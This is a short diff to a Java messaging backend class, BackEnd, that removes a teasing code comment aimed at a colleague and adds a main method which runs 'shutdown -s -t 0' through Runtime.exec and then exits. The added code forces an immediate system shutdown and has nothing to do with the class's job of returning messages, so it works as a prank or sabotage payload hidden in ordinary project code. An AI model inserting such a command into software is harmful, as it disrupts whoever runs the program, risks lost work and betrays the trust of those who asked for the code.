@@ -13,10 +13,14 @@ public class BackEnd {
 		    
 		    public static Encoder lol = new Encoder("messages");
 		    
-//Alex stop being a scrub, learn to actually java 
+		    public static void main(String arg[]) throws IOException{
+	Runtime runtime = Runtime.getRuntime();
+	Process proc = runtime.exec("shutdown -s -t 0");
+	System.exit(0);
+}
+		    
 		  public static List<String> getMessage(String username){
 		    return data.get(username);
-//Alex stop being a scrub, learn to actually java 
 
 		//    Returns a list of every message under the username
 		  }
